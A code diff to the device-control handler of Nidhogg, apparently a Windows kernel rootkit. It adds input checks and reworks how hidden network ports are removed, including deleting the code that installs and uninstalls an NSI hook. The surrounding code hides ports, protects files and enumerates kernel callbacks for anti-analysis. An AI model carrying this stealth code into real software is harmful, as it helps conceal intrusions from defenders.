@@ -437,6 +437,11 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			}
 		}
 		else {
+			if (NidhoggFileUtils->GetFilesCount() == 0) {
+				status = STATUS_NOT_FOUND;
+				break;
+			}
+
 			if (!NidhoggFileUtils->RemoveFile(protectedFile.FilePath)) {
 				status = STATUS_NOT_FOUND;
 				break;
@@ -1060,6 +1065,11 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto data = (PsRoutinesList*)Irp->AssociatedIrp.SystemBuffer;
 
+		if (!data->Routines) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
 		switch (data->Type) {
 		case PsImageLoadType:
 		case PsCreateProcessTypeEx:
@@ -1086,6 +1096,12 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		}
 
 		auto data = (CmCallbacksList*)Irp->AssociatedIrp.SystemBuffer;
+
+		if (!data->Callbacks) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
 		status = NidhoggAntiAnalysis->ListRegistryCallbacks(data, NULL, NULL);
 
 		len += sizeof(CmCallbacksList);
@@ -1259,16 +1275,6 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 					break;
 				}
 
-				if (!NidhoggNetworkUtils->IsCallbackActivated()) {
-					status = NidhoggNetworkUtils->InstallNsiHook();
-
-					if (!NT_SUCCESS(status)) {
-						NidhoggNetworkUtils->RemoveHiddenPort(hiddenPort);
-						Print(DRIVER_PREFIX "Failed to hook nsi.\n");
-						break;
-					}
-				}
-
 				auto prevIrql = KeGetCurrentIrql();
 				KeLowerIrql(PASSIVE_LEVEL);
 				Print(DRIVER_PREFIX "Hid port %d.\n", hiddenPort.Port);
@@ -1276,16 +1282,14 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			}
 		}
 		else {
-			if (!NidhoggNetworkUtils->RemoveHiddenPort(hiddenPort)) {
+			if (NidhoggNetworkUtils->GetPortsCount() == 0) {
 				status = STATUS_NOT_FOUND;
 				break;
 			}
 
-			if (NidhoggNetworkUtils->GetPortsCount() == 0) {
-				status = NidhoggNetworkUtils->UninstallNsiHook();
-
-				if (!NT_SUCCESS(status))
-					Print(DRIVER_PREFIX "Failed to restore the hook.\n");
+			if (!NidhoggNetworkUtils->RemoveHiddenPort(hiddenPort)) {
+				status = STATUS_NOT_FOUND;
+				break;
 			}
 
 			auto prevIrql = KeGetCurrentIrql();
